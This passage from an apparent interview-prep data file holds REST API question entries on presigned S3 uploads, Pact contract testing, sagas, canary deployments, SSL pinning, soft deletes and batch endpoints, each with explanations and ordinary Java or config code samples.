    detailedExplanation: [
      "**Approach 1: `multipart/form-data` (Direct Server Stream):**",
      "- Client posts multipart payload to REST endpoint (`POST /files`).",
      "- Server buffers or streams input bytes to disk/cloud storage.",
      "- Trade-off: High memory/CPU overhead on application servers; blocks worker threads during large 500MB uploads.",
      "**Approach 2: Presigned Cloud URLs (Direct-to-Cloud):**",
      "- Step 1: Client calls `POST /api/v1/files/presign` with `{ 'fileName': 'video.mp4', 'fileType': 'video/mp4' }`.",
      "- Step 2: REST API checks permissions and generates temporary AWS S3 Presigned Upload URL valid for 15 minutes.",
      "- Step 3: Client executes `PUT <presigned-url>` uploading file directly to AWS S3 bucket.",
      "- Step 4: S3 triggers an event or client notifies API `POST /files/complete` to save metadata.",
    ],
    example: {
      language: "JAVA",
      code: `// Spring Controller generating AWS S3 Presigned Upload URL
@PostMapping("/files/presigned-url")
public ResponseEntity<PresignedUrlDto> getPresignedUrl(@RequestBody FileRequest request) {
    PutObjectRequest objectRequest = PutObjectRequest.builder()
            .bucket("my-app-uploads")
            .key("user-uploads/" + UUID.randomUUID() + "-" + request.getFileName())
            .contentType(request.getFileType())
            .build();

    PutObjectPresignRequest presignRequest = PutObjectPresignRequest.builder()
            .signatureDuration(Duration.ofMinutes(15))
            .putObjectRequest(objectRequest)
            .build();

    URL uploadUrl = s3Presigner.presignPutObject(presignRequest).url();
    return ResponseEntity.ok(new PresignedUrlDto(uploadUrl.toString()));
}`,
    },
    interviewTip:
      "Always recommend Presigned URLs for production media uploads. It offloads gigabytes of network traffic directly to AWS S3 infrastructure, preserving application server bandwidth.",
    commonTrap:
      "Reading entire file upload payloads into byte arrays in application RAM (`byte[] bytes = file.getBytes()`). Always use streaming or presigned URLs.",
    followUpQuestions: [
      "How to validate file mime-types safely before issuing presigned URLs?",
      "How do AWS S3 Multipart Presigned Uploads work for 5GB+ files?",
    ],
    relatedTopics: ["REST APIs", "AWS S3", "File Uploads"],
    tags: ["REST APIs", "AWS", "Performance"],
  },
  {
    topicSlug: "rest-apis",
    slug: "api-contract-testing-vs-integration-testing",
    title: "What is API Contract Testing and how does it differ from Integration Testing?",
    difficulty: "MEDIUM",
    subtopic: "Operations",
    synopsis: "Consumer-Driven Contract testing (Pact) verifying interface compatibility without spinning up live services.",
    shortAnswer:
      "Integration testing tests real running microservices end-to-end over the network (slow, fragile, complex test setup). Contract testing (using tools like Pact) validates that the provider microservice satisfies the exact request/response schema expectations (contracts) defined by consumer microservices in isolation, executing in milliseconds without live network dependencies.",
    detailedExplanation: [
      "**Integration Test Friction:** Requires spinning up Docker containers (Testcontainers), databases, and 5 downstream dependent services in CI/CD pipeline.",
      "**Consumer-Driven Contract (CDC) Testing Flow:**",
      "1. Consumer team defines expected API mock interaction in a JSON Pact contract file (`GET /users/1` returns `{ 'id': 1, 'name': 'string' }`).",
      "2. Pact framework runs test against Consumer code using local mock server.",
      "3. Pact contract is uploaded to central Pact Broker repository.",
      "4. Provider service CI/CD pipeline fetches contract and verifies its backend controllers satisfy the expectations locally using mock data.",
    ],
    example: {
      language: "JAVA",
      code: `// Pact Consumer Contract Definition in Java
@Pact(consumer = "FrontendApp", provider = "UserService")
public RequestResponsePact createPact(PactDslWithProvider builder) {
    return builder
        .given("User 101 exists")
        .uponReceiving("A request for User 101")
            .path("/api/v1/users/101")
            .method("GET")
        .willRespondWith()
            .status(200)
            .body(new PactDslJsonBody()
                .numberType("id", 101)
                .stringType("name", "Niraj Mehta"))
        .toPact();
}`,
    },
    interviewTip:
      "Explain how Pact contract testing prevents breaking changes during microservice deployments: 'Can I Deploy?' check queries Pact Broker before deploying a provider to production.",
    commonTrap:
      "Relying solely on end-to-end integration tests in microservice CI pipelines. E2E tests are slow, flaky, and hard to pinpoint failures.",
    followUpQuestions: [
      "What is the Pact Broker and how does it integrate with GitHub Actions?",
      "Difference between Provider-Driven and Consumer-Driven Contract testing?",
    ],
    relatedTopics: ["REST APIs", "Testing", "Microservices", "Pact"],
    tags: ["REST APIs", "Testing", "CI/CD"],
  },
  {
    topicSlug: "rest-apis",
    slug: "saga-pattern-distributed-transactions-rest",
    title: "How do you handle database transactions across multiple REST API microservices (Saga Pattern)?",
    difficulty: "HARD",
    subtopic: "Operations",
    synopsis: "Managing distributed transactions using sequential local transactions and compensating rollback actions.",
    shortAnswer:
      "Because traditional 2-Phase Commit (2PC) ACID transactions do not scale across stateless REST microservices, the Saga Pattern is used. A Saga manages distributed transactions as a sequence of local service transactions. If a step fails, the Saga executes compensating REST calls in reverse order to undo prior changes.",
    detailedExplanation: [
      "**Choreography Saga (Event-Driven):** Each microservice performs its local transaction and publishes a domain event (Kafka/RabbitMQ). Neighboring services listen to events and execute their steps. If a service fails, it publishes a failure event triggering compensating handlers.",
      "**Orchestration Saga (Central Coordinator):** A dedicated Orchestrator service (Temporal, Camunda, or custom orchestrator) calls REST endpoints sequentially. If Step 3 (`PaymentService`) fails, the Orchestrator invokes `POST /orders/123/compensate-cancel` on Step 1.",
      "**Compensating Action Principle:** Compensating REST actions must be idempotent and eventually consistent.",
    ],
    example: {
      language: "JAVA",
      code: `// Saga Orchestration Sequence:
// 1. POST /order-service/orders -> Success (Order status: PENDING)
// 2. POST /payment-service/charges -> FAILED (Insufficient Funds!)
// 3. Compensating Trigger: POST /order-service/orders/123/cancel -> Reverts order status to CANCELLED`,
    },
    interviewTip:
      "Explain why 2PC (Two-Phase Commit) fails in microservices: 2PC locks database rows across network calls, causing latency bottlenecks and SPOF locks. Saga relies on Eventual Consistency.",
    commonTrap:
      "Assuming compensating transactions 'roll back' database rows magically. Compensating actions create new semantic undo records (e.g. refund transaction).",
    followUpQuestions: [
      "What is Choreography vs Orchestration in Saga design?",
      "How to implement the Outbox Pattern to ensure reliable event publishing?",
    ],
    relatedTopics: ["REST APIs", "Saga Pattern", "Microservices", "System Design"],
    tags: ["REST APIs", "System Design", "Microservices"],
  },
  {
    topicSlug: "rest-apis",
    slug: "zero-downtime-deployments-rest-apis",
    title: "What is zero-downtime deployment for REST APIs (Blue-Green & Canary deployments)?",
    difficulty: "MEDIUM",
    subtopic: "Operations",
    synopsis: "Deploying API updates continuously via Blue-Green switching or gradual Canary traffic shifting.",
    shortAnswer:
      "Zero-downtime deployment ensures API availability during software updates. Blue-Green deployment maintains two identical production environments; new code is deployed to Green and load balancer traffic switches instantly. Canary deployment gradually shifts a small percentage of real traffic (e.g., 5% -> 25% -> 100%) to the new version while monitoring error rates.",
    detailedExplanation: [
      "**Backward Database Compatibility:** Database migrations must follow the Expand-Contract pattern. New code must support both old and new DB column schemas simultaneously during deployment.",
      "**Blue-Green Deployment:** Environment Blue runs v1.0 (Live). Deploy v2.0 to Environment Green. Run health checks. Switch API Gateway router to Green. Fast rollback: switch router back to Blue.",
      "**Canary Deployment:** Route 5% of incoming user traffic to v2.0 Canary instances. Monitor Prometheus error rates, latency p99, and HTTP 5xx responses. Gradually increase percentage if healthy.",
    ],
    example: {
      language: "JAVA",
      code: `// Kubernetes Nginx Ingress Canary Route Configuration
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: api-canary
  annotations:
    nginx.ingress.kubernetes.io/canary: "true"
    nginx.ingress.kubernetes.io/canary-weight: "10" # 10% of traffic routes to v2 API!
spec:
  rules:
  - host: api.company.com
    http:
      paths:
      - path: /api/v1
        backend:
          service:
            name: user-service-v2
            port:
              number: 8080`,
    },
    interviewTip:
      "Emphasize: Zero-downtime API deployments REQUIRE backward-compatible database migrations (Expand-Contract pattern). You cannot drop a DB column in v2 while v1 app nodes are still running!",
    commonTrap:
      "Executing breaking database schema changes (like renaming a table column) concurrently with application deployment.",
    followUpQuestions: [
      "What is the Expand-Contract (Parallel Change) pattern in database migrations?",
      "How does Flagger automate Kubernetes Canary deployments based on Prometheus metrics?",
    ],
    relatedTopics: ["REST APIs", "DevOps", "Kubernetes", "Deployments"],
    tags: ["REST APIs", "DevOps", "Architecture"],
  },
  {
    topicSlug: "rest-apis",
    slug: "ssl-pinning-mobile-rest-apis",
    title: "What is SSL / TLS Pinning in mobile REST API security?",
    difficulty: "HARD",
    subtopic: "Security",
    synopsis: "Hardcoding expected server SSL certificate/public key hashes inside mobile apps to prevent Man-in-the-Middle attacks.",
    shortAnswer:
      "SSL/TLS Pinning is a mobile security technique where the mobile app hardcodes (pins) the server's exact SSL certificate or public key SHA-256 hash. During TLS handshake, the app verifies the server's certificate against the pinned hash, blocking Man-in-the-Middle (MITM) proxy interception tools (Charles Proxy, Burp Suite).",
    detailedExplanation: [
      "**Standard TLS Weakness:** Mobile OS trusts hundreds of Root Certificate Authorities (CAs). If an attacker installs a malicious root certificate on a device or uses a compromised CA, they can intercept and inspect encrypted HTTPS API traffic.",
      "**Public Key Pinning Mechanics:** Instead of pinning the leaf certificate (which expires yearly), the app pins the SHA-256 hash of the server's Subject Public Key Info (SPKI).",
      "**Pin Fallback Strategy:** Always include backup pin hashes (e.g. backup CA or secondary certificate key) to prevent app bricking when SSL certificates rotate.",
    ],
    example: {
      language: "JAVA",
      code: `// OkHttpClient SSL Public Key Pinning in Android
CertificatePinner certificatePinner = new CertificatePinner.Builder()
    .add("api.company.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=") // Primary Key
    .add("api.company.com", "sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=") // Backup Key
    .build();

OkHttpClient client = new OkHttpClient.Builder()
    .certificatePinner(certificatePinner)
    .build();`,
    },
    interviewTip:
      "Warn about the primary danger of SSL Pinning: If server certificates rotate unexpectedly and the mobile app does not have backup pins, ALL mobile clients will be locked out of the API until an App Store update is published.",
    commonTrap:
      "Pinning leaf certificates with short 90-day expiry windows without automated app updates or backup pins.",
    followUpQuestions: [
      "What is Certificate Transparency (CT) logs?",
      "Difference between Certificate Pinning and Public Key Pinning?",
    ],
    relatedTopics: ["REST APIs", "Security", "TLS", "Mobile"],
    tags: ["REST APIs", "Security", "Mobile"],
  },
  {
    topicSlug: "rest-apis",
    slug: "soft-delete-vs-hard-delete-rest-semantics",
    title: "What is soft delete vs hard delete in REST APIs and how does DELETE verb behave?",
    difficulty: "EASY",
    subtopic: "Operations",
    synopsis: "Setting `deleted_at` flag (soft delete) vs executing SQL `DELETE` row (hard delete) while keeping DELETE idempotent.",
    shortAnswer:
      "Hard delete physically purges the database row (`DELETE FROM users WHERE id=1`). Soft delete updates a flag (`UPDATE users SET deleted_at = NOW() WHERE id=1`), preserving audit history and allowing data recovery. From the REST client perspective, both should return HTTP `204 No Content` or `200 OK`, and subsequent GET calls must return `404 Not Found`.",
    detailedExplanation: [
      "**REST Client Transparency:** A REST client should not know whether the backend uses soft delete or hard delete under the hood. Once `DELETE /users/42` succeeds, `GET /users/42` must return `404 Not Found`.",
      "**Idempotency Guarantee:** Executing `DELETE /users/42` 10 times results in the entity being marked deleted. First call returns `204 No Content`; subsequent calls return `404 Not Found` (or `204`). The resource state on the server remains deleted.",
      "**Restoring Soft-Deleted Entities:** To restore a soft-deleted entity, expose an explicit action endpoint: `POST /users/42/restorations` or `PATCH /users/42` with `{ isDeleted: false }`.",
    ],
    example: {
      language: "JAVA",
      code: `// Soft Delete Implementation in Spring Data JPA Repository
@RestController
@RequestMapping("/api/v1/users")
public class UserController {

    @DeleteMapping("/{id}")
    @ResponseStatus(HttpStatus.NO_CONTENT)
    public void deleteUser(@PathVariable Long id) {
        userService.softDelete(id); // Sets deleted_at = Instant.now() in DB
    }
}`,
    },
    interviewTip:
      "Emphasize that GDPR Right to be Forgotten laws require real HARD DELETES (or irreversible anonymization) of personal user data, rendering simple soft-deleting illegal for certain compliance requirements.",
    commonTrap:
      "Returning soft-deleted items in standard `GET /users` collection queries. Ensure soft-deleted records are filtered out using JPA `@Where(clause = 'deleted_at IS NULL')`.",
    followUpQuestions: [
      "How to filter soft-deleted entities automatically in Hibernate using `@SQLDelete` and `@Where`?",
      "How does GDPR affect soft-delete policies?",
    ],
    relatedTopics: ["REST APIs", "HTTP Methods", "Database"],
    tags: ["REST APIs", "Database", "API Design"],
  },
  {
    topicSlug: "rest-apis",
    slug: "bulk-batch-operations-design-rest",
    title: "How do you design bulk or batch creation endpoints in REST APIs?",
    difficulty: "MEDIUM",
    subtopic: "Operations",
    synopsis: "Handling batch resource mutations using sub-resource collections and HTTP 207 Multi-Status or atomic 201/400.",
    shortAnswer:
      "Bulk creation is designed by posting a JSON array of entities to a collection resource: `POST /users/batch` or `POST /users`. For transactional bulk operations, process all atomically (all succeed `201 Created` or all rollback `400 Bad Request`). For partial batch success, use HTTP `207 Multi-Status` with per-item result status codes.",
    detailedExplanation: [
      "**Atomic Batch (All-or-Nothing):** Entire batch is wrapped in a single database transaction. If 1 of 100 entities fails validation, the entire transaction rolls back and returns 400 Bad Request with validation errors.",
      "**Partial Batch Success (HTTP 207 Multi-Status):** Server processes each item independently. Response returns WebDAV HTTP `207 Multi-Status` containing an array of individual status codes per item (e.g. Item 1: 201 Created; Item 2: 422 Unprocessable Entity).",
    ],
    example: {
      language: "JAVA",
      code: `// HTTP 207 Multi-Status Batch Response Payload
// Status: 207 Multi-Status
{
  "totalProcessed": 2,
  "results": [
    { "index": 0, "status": 201, "id": "usr_100", "message": "Created" },
    { "index": 1, "status": 422, "id": null, "message": "Email already registered" }
  ]
}`,
    },
    interviewTip:
      "Advocate for Atomic batch endpoints (`POST /users/batch`) for internal systems, and WebDAV 207 Multi-Status for public third-party integration APIs.",
    commonTrap:
      "Processing bulk POST requests by executing 1,000 individual SQL INSERT statements in a loop instead of batching SQL queries (`saveAll()`).",
    followUpQuestions: [
      "What is WebDAV HTTP 207 Multi-Status?",
      "How to configure Hibernate `hibernate.jdbc.batch_size` for batch inserts?",
    ],
    relatedTopics: ["REST APIs", "Batch Processing", "Database"],
    tags: ["REST APIs", "API Design", "Performance"],
  },
];
